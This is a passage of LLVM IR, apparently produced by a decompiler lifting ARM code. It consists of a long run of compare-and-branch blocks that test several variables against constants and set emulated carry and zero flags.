  store i1 %v2_f460, i1* %cpsr_c.global-to-local, align 1
  %v7_f460 = icmp eq i32 %v1_e85c, 174
  store i1 %v7_f460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f460, label %bb1619, label %dec_label_pc_f484

bb1619:                                           ; preds = %dec_label_pc_f460
  %v3_f464 = icmp ugt i32 %v1_e870, 137
  store i1 %v3_f464, i1* %cpsr_c.global-to-local, align 1
  %v8_f464 = icmp eq i32 %v1_e870, 138
  store i1 %v8_f464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f464, label %dec_label_pc_f46c, label %dec_label_pc_f484

dec_label_pc_f46c:                                ; preds = %bb1619
  store i32 %v1_e874, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f46c = icmp eq i32 %v1_e874, 0
  store i1 %v2_f46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f46c, label %bb1621, label %bb1620

bb1620:                                           ; preds = %dec_label_pc_f46c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1621

bb1621:                                           ; preds = %dec_label_pc_f46c, %bb1620
  %v0_f47c.pr = phi i32 [ 0, %dec_label_pc_f46c ], [ 1, %bb1620 ]
  %v2_f474 = icmp ugt i32 %v1_e874, 125
  store i1 %v2_f474, i1* %cpsr_c.global-to-local, align 1
  %v7_f474 = icmp eq i32 %v1_e874, 126
  store i1 %v7_f474, i1* %cpsr_z.global-to-local, align 1
  %v2_f478 = xor i1 %v7_f474, true
  %v3_f478 = and i1 %v2_f474, %v2_f478
  br i1 %v3_f478, label %.thread260, label %bb1622

.thread260:                                       ; preds = %bb1621
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f484

bb1622:                                           ; preds = %bb1621
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f47c = icmp eq i32 %v0_f47c.pr, 0
  store i1 %v2_f47c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f47c, label %dec_label_pc_f484, label %dec_label_pc_e858

dec_label_pc_f484:                                ; preds = %dec_label_pc_f460, %.thread260, %bb1622, %bb1619
  %v2_f484 = icmp ugt i32 %v1_e870, 240
  store i1 %v2_f484, i1* %cpsr_c.global-to-local, align 1
  %v7_f484 = icmp eq i32 %v1_e870, 241
  store i1 %v7_f484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f484, label %.thread263, label %.thread264

.thread264:                                       ; preds = %dec_label_pc_f484
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4a8

.thread263:                                       ; preds = %dec_label_pc_f484
  store i32 %.1975, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f490 = icmp eq i1 %v7_e900, false
  store i1 %v2_f490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f490, label %dec_label_pc_f4a8, label %dec_label_pc_f498

dec_label_pc_f498:                                ; preds = %.thread263
  %v1_f498 = add nsw i32 %v1_e874, -255
  store i32 %v1_f498, i32* %r3.global-to-local, align 4
  %v2_f498 = icmp eq i32 %v1_e874, 255
  store i1 %v2_f498, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f498, label %bb1624, label %bb1623

bb1623:                                           ; preds = %dec_label_pc_f498
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1624

bb1624:                                           ; preds = %dec_label_pc_f498, %bb1623
  %v0_f4a0 = phi i32 [ %v1_f498, %dec_label_pc_f498 ], [ 1, %bb1623 ]
  %v2_f4a0 = and i32 %v3_e864, 64
  %v3_f4a0 = icmp ne i32 %v2_f4a0, 0
  store i1 %v3_f4a0, i1* %cpsr_c.global-to-local, align 1
  %v4_f4a0 = udiv i32 %v1_e874, 128
  %v5_f4a0 = and i32 %v0_f4a0, %v4_f4a0
  store i32 %v5_f4a0, i32* %r3.global-to-local, align 4
  %v6_f4a0 = icmp eq i32 %v5_f4a0, 0
  store i1 %v6_f4a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f4a0, label %dec_label_pc_f4a8, label %dec_label_pc_e858

dec_label_pc_f4a8:                                ; preds = %.thread264, %bb1624, %.thread263
  store i32 %.2004, i32* %r3.global-to-local, align 4
  %v2_f4ac = icmp ugt i32 %v1_e870, 198
  store i1 %v2_f4ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f4ac = icmp eq i32 %v1_e870, 199
  store i1 %v7_f4ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4ac, label %.thread267, label %.thread268

.thread268:                                       ; preds = %dec_label_pc_f4a8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4dc

.thread267:                                       ; preds = %dec_label_pc_f4a8
  store i32 %.2004, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4b8 = icmp eq i1 %v7_ed5c, false
  store i1 %v2_f4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4b8, label %dec_label_pc_f4dc, label %dec_label_pc_f4c0

dec_label_pc_f4c0:                                ; preds = %.thread267
  %v2_f4c0 = icmp ugt i32 %v1_e874, 62
  store i1 %v2_f4c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4c0 = icmp eq i32 %v1_e874, 63
  store i1 %v7_f4c0, i1* %cpsr_z.global-to-local, align 1
  %v2_f4c4 = xor i1 %v2_f4c0, true
  %v3_f4c4 = or i1 %v7_f4c0, %v2_f4c4
  br i1 %v3_f4c4, label %bb1625, label %bb1626

bb1625:                                           ; preds = %dec_label_pc_f4c0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1626

bb1626:                                           ; preds = %dec_label_pc_f4c0, %bb1625
  %v0_f4d4.pr905 = phi i32 [ %.2004, %dec_label_pc_f4c0 ], [ 0, %bb1625 ]
  %v2_f4c8 = xor i1 %v7_f4c0, true
  %v3_f4c8 = and i1 %v2_f4c0, %v2_f4c8
  br i1 %v3_f4c8, label %bb1627, label %bb1628

bb1627:                                           ; preds = %bb1626
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1628

bb1628:                                           ; preds = %bb1626, %bb1627
  %v0_f4d4.pr = phi i32 [ %v0_f4d4.pr905, %bb1626 ], [ 1, %bb1627 ]
  %v2_f4cc = icmp ugt i32 %v1_e874, 125
  store i1 %v2_f4cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4cc = icmp eq i32 %v1_e874, 126
  store i1 %v7_f4cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f4d0 = xor i1 %v7_f4cc, true
  %v3_f4d0 = and i1 %v2_f4cc, %v2_f4d0
  br i1 %v3_f4d0, label %.thread272, label %bb1629

.thread272:                                       ; preds = %bb1628
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4dc

bb1629:                                           ; preds = %bb1628
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4d4 = icmp eq i32 %v0_f4d4.pr, 0
  store i1 %v2_f4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4d4, label %dec_label_pc_f4dc, label %dec_label_pc_e858

dec_label_pc_f4dc:                                ; preds = %.thread272, %.thread268, %bb1629, %.thread267
  store i32 %.2004, i32* %r3.global-to-local, align 4
  %v2_f4e0 = icmp ugt i32 %v1_e870, 210
  store i1 %v2_f4e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4e0 = icmp eq i32 %v1_e870, 211
  store i1 %v7_f4e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4e0, label %.thread275, label %.thread276

.thread276:                                       ; preds = %dec_label_pc_f4dc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f510

.thread275:                                       ; preds = %dec_label_pc_f4dc
  store i32 %.2004, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4ec = icmp eq i1 %v7_ed5c, false
  store i1 %v2_f4ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4ec, label %dec_label_pc_f510, label %dec_label_pc_f4f4

dec_label_pc_f4f4:                                ; preds = %.thread275
  %v2_f4f4 = icmp ugt i32 %v1_e874, 94
  store i1 %v2_f4f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f4f4 = icmp eq i32 %v1_e874, 95
  store i1 %v7_f4f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f4f8 = xor i1 %v2_f4f4, true
  %v3_f4f8 = or i1 %v7_f4f4, %v2_f4f8
  br i1 %v3_f4f8, label %bb1630, label %bb1631

bb1630:                                           ; preds = %dec_label_pc_f4f4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1631

bb1631:                                           ; preds = %dec_label_pc_f4f4, %bb1630
  %v0_f508.pr908 = phi i32 [ %.2004, %dec_label_pc_f4f4 ], [ 0, %bb1630 ]
  %v2_f4fc = xor i1 %v7_f4f4, true
  %v3_f4fc = and i1 %v2_f4f4, %v2_f4fc
  br i1 %v3_f4fc, label %bb1632, label %bb1633

bb1632:                                           ; preds = %bb1631
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1633

bb1633:                                           ; preds = %bb1631, %bb1632
  %v0_f508.pr = phi i32 [ %v0_f508.pr908, %bb1631 ], [ 1, %bb1632 ]
  %v2_f500 = icmp ugt i32 %v1_e874, 125
  store i1 %v2_f500, i1* %cpsr_c.global-to-local, align 1
  %v7_f500 = icmp eq i32 %v1_e874, 126
  store i1 %v7_f500, i1* %cpsr_z.global-to-local, align 1
  %v2_f504 = xor i1 %v7_f500, true
  %v3_f504 = and i1 %v2_f500, %v2_f504
  br i1 %v3_f504, label %.thread280, label %bb1634

.thread280:                                       ; preds = %bb1633
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f510

bb1634:                                           ; preds = %bb1633
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f508 = icmp eq i32 %v0_f508.pr, 0
  store i1 %v2_f508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f508, label %dec_label_pc_f510, label %dec_label_pc_e858

dec_label_pc_f510:                                ; preds = %.thread280, %.thread276, %bb1634, %.thread275
  store i32 %.1996, i32* %r3.global-to-local, align 4
  %v2_f514 = and i32 %.1979, %.1996
  %v4_f514 = icmp eq i32 %v2_f514, 0
  store i1 %v4_f514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f514, label %dec_label_pc_f528, label %dec_label_pc_f51c

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f510
  %v2_f51c = icmp eq i32 %v1_e874, 255
  store i1 %v2_f51c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f51c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f51c, label %dec_label_pc_f528, label %bb1635

bb1635:                                           ; preds = %dec_label_pc_f51c
  %v3_f520 = icmp ugt i32 %v1_e874, 190
  store i1 %v3_f520, i1* %cpsr_c.global-to-local, align 1
  %v8_f520 = icmp eq i32 %v1_e874, 191
  store i1 %v8_f520, i1* %cpsr_z.global-to-local, align 1
  %v2_f524 = xor i1 %v8_f520, true
  %v3_f524 = and i1 %v3_f520, %v2_f524
  br i1 %v3_f524, label %dec_label_pc_e858, label %dec_label_pc_f528

dec_label_pc_f528:                                ; preds = %dec_label_pc_f51c, %bb1635, %dec_label_pc_f510
  %v7_f528 = icmp eq i32 %v1_e85c, 37
  %.2023 = zext i1 %v7_f528 to i32
  store i32 %.2023, i32* @sl, align 4
  %v2_f534 = icmp ugt i32 %v1_e870, 138
  store i1 %v2_f534, i1* %cpsr_c.global-to-local, align 1
  %v7_f534 = icmp eq i32 %v1_e870, 139
  store i1 %v7_f534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f534, label %bb1638, label %dec_label_pc_f558

bb1638:                                           ; preds = %dec_label_pc_f528
  %v2_f528 = icmp ugt i32 %v1_e85c, 36
  store i1 %v2_f528, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f528, label %dec_label_pc_f540, label %dec_label_pc_f558

dec_label_pc_f540:                                ; preds = %bb1638
  store i32 %v1_e874, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f540 = icmp eq i32 %v1_e874, 0
  store i1 %v2_f540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f540, label %bb1640, label %bb1639

bb1639:                                           ; preds = %dec_label_pc_f540
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1640

bb1640:                                           ; preds = %dec_label_pc_f540, %bb1639
  %v0_f550.pr = phi i32 [ 0, %dec_label_pc_f540 ], [ 1, %bb1639 ]
  %v2_f548 = icmp ugt i32 %v1_e874, 29
  store i1 %v2_f548, i1* %cpsr_c.global-to-local, align 1
  %v7_f548 = icmp eq i32 %v1_e874, 30
  store i1 %v7_f548, i1* %cpsr_z.global-to-local, align 1
  %v2_f54c = xor i1 %v7_f548, true
  %v3_f54c = and i1 %v2_f548, %v2_f54c
  br i1 %v3_f54c, label %.thread286, label %bb1641

.thread286:                                       ; preds = %bb1640
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f558

bb1641:                                           ; preds = %bb1640
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f550 = icmp eq i32 %v0_f550.pr, 0
  store i1 %v2_f550, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f550, label %dec_label_pc_f558, label %dec_label_pc_e858

dec_label_pc_f558:                                ; preds = %dec_label_pc_f528, %.thread286, %bb1641, %bb1638
  %v0_f584.pr914 = phi i32 [ %.1996, %dec_label_pc_f528 ], [ 0, %.thread286 ], [ 0, %bb1641 ], [ %.1996, %bb1638 ]
  %v7_f558 = icmp eq i32 %v1_e85c, 67
  %.2024 = zext i1 %v7_f558 to i32
  %v2_f564 = icmp ugt i32 %v1_e870, 206
  store i1 %v2_f564, i1* %cpsr_c.global-to-local, align 1
  %v7_f564 = icmp eq i32 %v1_e870, 207
  store i1 %v7_f564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f564, label %bb1644, label %dec_label_pc_f58c

bb1644:                                           ; preds = %dec_label_pc_f558
  %v2_f558 = icmp ugt i32 %v1_e85c, 66
  store i1 %v2_f558, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f558, label %dec_label_pc_f570, label %dec_label_pc_f58c

dec_label_pc_f570:                                ; preds = %bb1644
  %v2_f570 = icmp ugt i32 %v1_e874, 62
  store i1 %v2_f570, i1* %cpsr_c.global-to-local, align 1
  %v7_f570 = icmp eq i32 %v1_e874, 63
  store i1 %v7_f570, i1* %cpsr_z.global-to-local, align 1
  %v2_f574 = xor i1 %v2_f570, true
  %v3_f574 = or i1 %v7_f570, %v2_f574
  br i1 %v3_f574, label %bb1645, label %bb1646

bb1645:                                           ; preds = %dec_label_pc_f570
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1646

bb1646:                                           ; preds = %dec_label_pc_f570, %bb1645
  %v0_f584.pr913 = phi i32 [ %v0_f584.pr914, %dec_label_pc_f570 ], [ 0, %bb1645 ]
  %v2_f578 = xor i1 %v7_f570, true
  %v3_f578 = and i1 %v2_f570, %v2_f578
  br i1 %v3_f578, label %bb1647, label %bb1648

bb1647:                                           ; preds = %bb1646
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1648

bb1648:                                           ; preds = %bb1646, %bb1647
  %v0_f584.pr = phi i32 [ %v0_f584.pr913, %bb1646 ], [ 1, %bb1647 ]
  %v2_f57c = icmp ugt i32 %v1_e874, 93
  store i1 %v2_f57c, i1* %cpsr_c.global-to-local, align 1
  %v7_f57c = icmp eq i32 %v1_e874, 94
  store i1 %v7_f57c, i1* %cpsr_z.global-to-local, align 1
  %v2_f580 = xor i1 %v7_f57c, true
  %v3_f580 = and i1 %v2_f57c, %v2_f580
  br i1 %v3_f580, label %.thread292, label %bb1649

.thread292:                                       ; preds = %bb1648
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f58c

bb1649:                                           ; preds = %bb1648
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f584 = icmp eq i32 %v0_f584.pr, 0
  store i1 %v2_f584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f584, label %dec_label_pc_f58c, label %dec_label_pc_e858

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f558, %.thread292, %bb1649, %bb1644
  %v2_f58c = icmp ugt i32 %v1_e870, 204
  store i1 %v2_f58c, i1* %cpsr_c.global-to-local, align 1
  %v7_f58c = icmp eq i32 %v1_e870, 205
  store i1 %v7_f58c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f58c, label %.thread295, label %.thread296

.thread296:                                       ; preds = %dec_label_pc_f58c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f5b4

.thread295:                                       ; preds = %dec_label_pc_f58c
  store i32 %.2024, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f598 = icmp eq i1 %v7_f558, false
  store i1 %v2_f598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f598, label %dec_label_pc_f5b4, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %.thread295
  %v2_f5a0 = icmp ugt i32 %v1_e874, 189
  store i1 %v2_f5a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5a0 = icmp eq i32 %v1_e874, 190
  store i1 %v7_f5a0, i1* %cpsr_z.global-to-local, align 1
  %v2_f5a4 = xor i1 %v7_f5a0, true
  %v3_f5a4 = and i1 %v2_f5a0, %v2_f5a4
  br i1 %v3_f5a4, label %bb1650, label %bb1651

bb1650:                                           ; preds = %dec_label_pc_f5a0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1651

bb1651:                                           ; preds = %dec_label_pc_f5a0, %bb1650
  %v0_f5ac917 = phi i32 [ %.2024, %dec_label_pc_f5a0 ], [ 0, %bb1650 ]
  %v2_f5a8 = xor i1 %v2_f5a0, true
  %v3_f5a8 = or i1 %v7_f5a0, %v2_f5a8
  br i1 %v3_f5a8, label %bb1652, label %bb1653

bb1652:                                           ; preds = %bb1651
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1653

bb1653:                                           ; preds = %bb1651, %bb1652
  %v0_f5ac = phi i32 [ %v0_f5ac917, %bb1651 ], [ 1, %bb1652 ]
  %v2_f5ac = and i32 %v3_e864, 64
  %v3_f5ac = icmp ne i32 %v2_f5ac, 0
  store i1 %v3_f5ac, i1* %cpsr_c.global-to-local, align 1
  %v4_f5ac = udiv i32 %v1_e874, 128
  %v5_f5ac = and i32 %v0_f5ac, %v4_f5ac
  store i32 %v5_f5ac, i32* %r3.global-to-local, align 4
  %v6_f5ac = icmp eq i32 %v5_f5ac, 0
  store i1 %v6_f5ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f5ac, label %dec_label_pc_f5b4, label %dec_label_pc_e858

dec_label_pc_f5b4:                                ; preds = %.thread296, %bb1653, %.thread295
  store i32 %.1999, i32* %r3.global-to-local, align 4
  %v2_f5b8 = icmp ugt i32 %v1_e870, 239
  store i1 %v2_f5b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5b8 = icmp eq i32 %v1_e870, 240
  store i1 %v7_f5b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5b8, label %.thread299, label %.thread300

.thread300:                                       ; preds = %dec_label_pc_f5b4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f5e0

.thread299:                                       ; preds = %dec_label_pc_f5b4
  store i32 %.1999, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5c4 = icmp eq i1 %v7_ec68, false
  store i1 %v2_f5c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5c4, label %dec_label_pc_f5e0, label %dec_label_pc_f5cc

dec_label_pc_f5cc:                                ; preds = %.thread299
  %v2_f5cc = icmp ugt i32 %v1_e874, 141
  store i1 %v2_f5cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5cc = icmp eq i32 %v1_e874, 142
  store i1 %v7_f5cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f5d0 = xor i1 %v7_f5cc, true
  %v3_f5d0 = and i1 %v2_f5cc, %v2_f5d0
  br i1 %v3_f5d0, label %bb1654, label %bb1655

bb1654:                                           ; preds = %dec_label_pc_f5cc
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1655

bb1655:                                           ; preds = %dec_label_pc_f5cc, %bb1654
  %v0_f5d8920 = phi i32 [ %.1999, %dec_label_pc_f5cc ], [ 0, %bb1654 ]
  %v2_f5d4 = xor i1 %v2_f5cc, true
  %v3_f5d4 = or i1 %v7_f5cc, %v2_f5d4
  br i1 %v3_f5d4, label %bb1656, label %bb1657

bb1656:                                           ; preds = %bb1655
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1657

bb1657:                                           ; preds = %bb1655, %bb1656
  %v0_f5d8 = phi i32 [ %v0_f5d8920, %bb1655 ], [ 1, %bb1656 ]
  %v2_f5d8 = and i32 %v3_e864, 64
  %v3_f5d8 = icmp ne i32 %v2_f5d8, 0
  store i1 %v3_f5d8, i1* %cpsr_c.global-to-local, align 1
  %v4_f5d8 = udiv i32 %v1_e874, 128
  %v5_f5d8 = and i32 %v0_f5d8, %v4_f5d8
  store i32 %v5_f5d8, i32* %r3.global-to-local, align 4
  %v6_f5d8 = icmp eq i32 %v5_f5d8, 0
  store i1 %v6_f5d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f5d8, label %dec_label_pc_f5e0, label %dec_label_pc_e858

dec_label_pc_f5e0:                                ; preds = %.thread300, %bb1657, %.thread299
  store i32 %.1984, i32* %r3.global-to-local, align 4
  %v2_f5e4 = icmp ugt i32 %v1_e85c, 81
  store i1 %v2_f5e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e4 = icmp eq i32 %v1_e85c, 82
  store i1 %v7_f5e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5e4, label %.thread303, label %.thread304

.thread304:                                       ; preds = %dec_label_pc_f5e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f610

.thread303:                                       ; preds = %dec_label_pc_f5e0
  store i32 %.1984, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5f0 = icmp eq i1 %v7_ea30, false
  store i1 %v2_f5f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5f0, label %dec_label_pc_f610, label %dec_label_pc_f5f8

dec_label_pc_f5f8:                                ; preds = %.thread303
  store i32 %v1_e874, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5f8 = icmp eq i32 %v1_e874, 0
  store i1 %v2_f5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5f8, label %bb1659, label %bb1658

bb1658:                                           ; preds = %dec_label_pc_f5f8
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1659

bb1659:                                           ; preds = %dec_label_pc_f5f8, %bb1658
  %v0_f608.pr = phi i32 [ 0, %dec_label_pc_f5f8 ], [ 1, %bb1658 ]
  %v2_f600 = icmp ugt i32 %v1_e874, 13
  store i1 %v2_f600, i1* %cpsr_c.global-to-local, align 1
  %v7_f600 = icmp eq i32 %v1_e874, 14
  store i1 %v7_f600, i1* %cpsr_z.global-to-local, align 1
  %v2_f604 = xor i1 %v7_f600, true
  %v3_f604 = and i1 %v2_f600, %v2_f604
  br i1 %v3_f604, label %.thread308, label %bb1660

.thread308:                                       ; preds = %bb1659
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f610

bb1660:                                           ; preds = %bb1659
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f608 = icmp eq i32 %v0_f608.pr, 0
  store i1 %v2_f608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f608, label %dec_label_pc_f610, label %dec_label_pc_e858

dec_label_pc_f610:                                ; preds = %.thread308, %.thread304, %bb1660, %.thread303
  store i32 %.1993, i32* %r3.global-to-local, align 4
  %v2_f614 = icmp ugt i32 %v1_e85c, 94
  store i1 %v2_f614, i1* %cpsr_c.global-to-local, align 1
  %v7_f614 = icmp eq i32 %v1_e85c, 95
  store i1 %v7_f614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f614, label %.thread311, label %.thread312

.thread312:                                       ; preds = %dec_label_pc_f610
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f644

.thread311:                                       ; preds = %dec_label_pc_f610
  store i32 %.1993, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f620 = icmp eq i1 %v7_ebac, false
  store i1 %v2_f620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f620, label %dec_label_pc_f644, label %dec_label_pc_f628

dec_label_pc_f628:                                ; preds = %.thread311
  %v2_f628 = icmp ugt i32 %v1_e874, 6
  store i1 %v2_f628, i1* %cpsr_c.global-to-local, align 1
  %v7_f628 = icmp eq i32 %v1_e874, 7
  store i1 %v7_f628, i1* %cpsr_z.global-to-local, align 1
  %v2_f62c = xor i1 %v2_f628, true
  %v3_f62c = or i1 %v7_f628, %v2_f62c
  br i1 %v3_f62c, label %bb1661, label %bb1662

bb1661:                                           ; preds = %dec_label_pc_f628
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1662

bb1662:                                           ; preds = %dec_label_pc_f628, %bb1661
  %v0_f63c.pr925 = phi i32 [ %.1993, %dec_label_pc_f628 ], [ 0, %bb1661 ]
  %v2_f630 = xor i1 %v7_f628, true
  %v3_f630 = and i1 %v2_f628, %v2_f630
  br i1 %v3_f630, label %bb1663, label %bb1664

bb1663:                                           ; preds = %bb1662
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1664

bb1664:                                           ; preds = %bb1662, %bb1663
  %v0_f63c.pr = phi i32 [ %v0_f63c.pr925, %bb1662 ], [ 1, %bb1663 ]
  %v2_f634 = icmp ugt i32 %v1_e874, 61
  store i1 %v2_f634, i1* %cpsr_c.global-to-local, align 1
  %v7_f634 = icmp eq i32 %v1_e874, 62
  store i1 %v7_f634, i1* %cpsr_z.global-to-local, align 1
  %v2_f638 = xor i1 %v7_f634, true
  %v3_f638 = and i1 %v2_f634, %v2_f638
  br i1 %v3_f638, label %.thread316, label %bb1665

.thread316:                                       ; preds = %bb1664
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f644

bb1665:                                           ; preds = %bb1664
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f63c = icmp eq i32 %v0_f63c.pr, 0
  store i1 %v2_f63c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f63c, label %dec_label_pc_f644, label %dec_label_pc_e858

dec_label_pc_f644:                                ; preds = %.thread316, %.thread312, %bb1665, %.thread311
  store i1 %v2_f010, i1* %cpsr_c.global-to-local, align 1
  %.2025 = zext i1 %v7_f010 to i32
  store i32 %.2025, i32* %r4.global-to-local, align 4
  %v2_f654 = and i32 %.2025, %.2001
  %v4_f654 = icmp eq i32 %v2_f654, 0
  store i1 %v4_f654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f654, label %dec_label_pc_f678, label %dec_label_pc_f65c

dec_label_pc_f65c:                                ; preds = %dec_label_pc_f644
  %v2_f65c = icmp ugt i32 %v1_e874, 30
  store i1 %v2_f65c, i1* %cpsr_c.global-to-local, align 1
  %v7_f65c = icmp eq i32 %v1_e874, 31
  store i1 %v7_f65c, i1* %cpsr_z.global-to-local, align 1
  %v2_f660 = xor i1 %v2_f65c, true
  %v3_f660 = or i1 %v7_f65c, %v2_f660
  br i1 %v3_f660, label %bb1668, label %bb1669

bb1668:                                           ; preds = %dec_label_pc_f65c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1669

